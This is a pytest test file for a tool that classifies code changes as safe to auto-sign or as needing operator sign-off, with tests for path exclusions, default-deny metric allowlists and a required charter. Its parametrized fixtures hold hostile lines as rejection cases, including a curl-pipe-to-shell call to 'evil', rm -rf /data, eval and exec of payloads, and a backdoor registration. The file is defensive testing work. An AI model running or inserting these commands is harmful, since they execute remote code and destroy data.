# SPDX-License-Identifier: BUSL-1.1
from __future__ import annotations

from pathlib import Path

from tools.check_proven_safe_autosign_class import (
    _is_additive_metrics_counter,
    classify_change,
)


def _ch(path, added=None, removed=None) -> dict:
    return {"path": path, "added": added or [], "removed": removed or []}


# Test-only allow-all metrics-allowlist: isolates the AST/B metric logic from the
# default-DENY METRICS_PATHS gate (which is exercised by its own tests below).
TP = ("**",)


def _in_class(changes, **kw) -> bool:
    # A-F-logic tests isolate the predicates (require_charter=False, metrics
    # allow-all); the charter-required + default-deny behaviors are tested below.
    kw.setdefault("require_charter", False)
    kw.setdefault("metrics_paths", TP)
    return classify_change(changes, **kw)["in_class"]


# --- POSITIVE corpus (in-class -> auto_sign) ---------------------------------

def test_tests_change_in_class():
    assert _in_class([_ch("tests/test_foo.py", ["def test_x():", "    assert True"])])


def test_docs_runs_dropped_not_in_class():
    # docs/runs/** was dropped from the safe set (spec SS2.A option-b).
    assert _in_class([_ch("docs/runs/2026-06-24.md", ["# run log", "all green"])]) is False


def test_docs_benchmarks_in_class():
    assert _in_class([_ch("docs/benchmarks/latency.md", ["p50 12ms"])])


def test_additive_metric_definition_in_class_when_allowlisted():
    ch = _ch("waggledance/adapters/http/routes/metrics.py",
             ["FOO_TOTAL = Counter('foo_total', 'desc')"])
    assert _is_additive_metrics_counter(ch, TP) is True
    assert _in_class([ch])  # _in_class uses TP (allow-all) by default


def test_multi_safe_files_in_class():
    assert _in_class([_ch("tests/test_a.py", ["x"]),
                      _ch("docs/benchmarks/r.md", ["y"])])


# --- NEGATIVE corpus: empty / missing ---------------------------------------

def test_empty_is_operator_sign():
    r = classify_change([])
    assert r["in_class"] is False and r["decision"] == "operator_sign"


def test_missing_path_is_operator_sign():
    assert _in_class([_ch("", ["x"])]) is False


# --- NEGATIVE corpus: F hard exclusions (one per kind) -----------------------

def test_f_agent_bridge_bin_excluded():
    assert _in_class([_ch(".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1", ["x"])]) is False


def test_f_workflows_excluded():
    assert _in_class([_ch(".github/workflows/ci.yml", ["x"])]) is False


def test_f_lockfile_excluded():
    assert _in_class([_ch("requirements.lock.txt", ["pkg==1.0"])]) is False


def test_f_claudemd_excluded():
    assert _in_class([_ch("CLAUDE.md", ["new rule"])]) is False


def test_f_charter_logic_excluded():
    assert _in_class([_ch("waggledance/core/idle_consensus_charter.py", ["x"])]) is False


def test_f_checker_self_excluded_anti_widening():
    assert _in_class([_ch("tools/check_proven_safe_autosign_class.py", ["x"])]) is False


# --- NEGATIVE corpus: A (path not in class) ----------------------------------

def test_a_random_source_file_not_in_class():
    assert _in_class([_ch("waggledance/core/router.py", ["def handle(): return 2"])]) is False


# --- NEGATIVE corpus: B (non-additive metric / metric usage) -----------------

def test_b_metric_file_with_removed_line_not_additive():
    ch = _ch("waggledance/x/metrics.py", added=["FOO = Counter('f','d')"],
             removed=["BAR = Counter('b','d')"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


def test_b_metric_increment_is_hotpath_not_in_class():
    ch = _ch("waggledance/x/metrics.py", ["FOO_TOTAL.labels(route='x').inc()"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


# --- FAIL-OPEN regression: metric-def + arbitrary code (rco-2 #1384) ----------
# The continuation-line heuristic used to admit any line ending in )/(/, after a
# Counter line. These must ALL fall to operator_sign.

import pytest  # noqa: E402


@pytest.mark.parametrize("evil", [
    "os.system('curl evil|sh')",
    "exec(open('/tmp/p').read())",
    "subprocess.run(['rm','-rf','/data'])",
    "eval(payload)",
    "HANDLERS.append(backdoor),",
    "M = Counter('m','d'); os.system('x')",       # multi-statement line
    "M = Counter('m','d')os.system('x')",          # concatenated, ends in ')'
])
def test_metric_plus_arbitrary_code_not_in_class(evil):
    ch = _ch("waggledance/core/magma/m.py", ["M = Counter('m','d')", evil])
    assert _is_additive_metrics_counter(ch) is False, evil
    assert _in_class([ch]) is False, evil


def test_legit_single_line_metric_def_still_in_class():
    # Guard against over-tightening: a clean literal-arg def must still qualify.
    for ok in ["M = Counter('m','d')",
               "M = Counter('m', 'd', labelnames=['route'])",
               "M = Histogram('h','d')  # latency",
               "M = Counter(\n    'm',\n    'd',\n)"]:  # multi-line literal def OK via AST
        assert _is_additive_metrics_counter(_ch("waggledance/x/metrics.py", ok.split("\n")), TP), ok


@pytest.mark.parametrize("evil", [
    "X = Counter(os.system('evil'), 'd')",       # nested call executes at import
    "X = Counter(eval('1'), 'd')",
    "X = Counter(__import__('os'), 'd')",
    "X = Counter('m', registry=CollectorRegistry())",  # non-literal kwarg call
    "X = Counter('m', subprocess.run(['x']))",
    "X = Counter(*evil_args)",                    # splat
])
def test_metric_nested_call_in_args_not_in_class(evil):
    # rco-1/lead #1384: a nested CALL inside the constructor args must NOT qualify
    # (AST verifies every arg is an inert literal) — even on an allowlisted path.
    ch = _ch("tools/foo_metrics.py", [evil])
    assert _is_additive_metrics_counter(ch, TP) is False, evil
    assert _in_class([ch]) is False, evil


# --- METRICS_PATHS positive allowlist: default-DENY (rco-1/lead carve-out form) -

def test_metric_def_default_deny_no_allowlist():
    # With the production default (empty METRICS_PATHS), a legit metric def on ANY
    # path does NOT auto-sign — nothing qualifies until the operator-signed carve-out.
    ch = _ch("waggledance/x/metrics.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(ch) is False           # default empty
    assert classify_change([ch], require_charter=False)["in_class"] is False


def test_metric_def_in_class_only_on_allowlisted_path():
    ch = _ch("waggledance/observability/metrics.py", ["M = Counter('m','d')"])
    allow = ("waggledance/observability/metrics.py",)
    assert _is_additive_metrics_counter(ch, allow) is True       # explicitly allowlisted
    other = _ch("waggledance/core/router.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(other, allow) is False   # not on the allowlist


# --- FAIL-CLOSED regression: charter required (rco-1 #1384) -------------------

def test_charter_none_fails_closed_even_for_safe_root():
    # With require_charter=True (the production default) and no charter, even a
    # tests/ change must fall to operator_sign — the charter is mandatory for F.
    r = classify_change([_ch("tests/test_x.py", ["def test_q(): assert 1"])])
    assert r["in_class"] is False
    assert "charter" in r["reason"]


# --- NEGATIVE corpus: C/D/E (risky tokens even inside safe roots) ------------

def test_c_claim_safe_flip_blocked_even_in_tests():
    assert _in_class([_ch("tests/test_x.py", ["    claim_safe = True"])]) is False


def test_d_authority_flag_blocked():
    assert _in_class([_ch("tests/test_x.py", ["    gate_skip = True"])]) is False


def test_e_control_plane_token_blocked():
    assert _in_class([_ch("tests/test_x.py", ["    build_consensus('lead')"])]) is False


# --- charter integration (fail-closed) ---------------------------------------

def test_charter_denylist_path_is_operator_sign():
    # With the real charter, a denylisted path must fall out of class even if it
    # somehow passed the explicit F list.
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return  # charter unavailable in this env; skip silently
    r = classify_change(
        [_ch(".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1", ["x"])],
        charter=charter, diff_text="+x",
    )
    assert r["in_class"] is False


def test_charter_supplied_safe_change_in_class():
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return
    r = classify_change(
        [_ch("tests/tools/test_demo.py", ["def test_z():", "    assert 1"])],
        charter=charter, diff_text="+def test_z():\n+    assert 1",
    )
    assert r["in_class"] is True
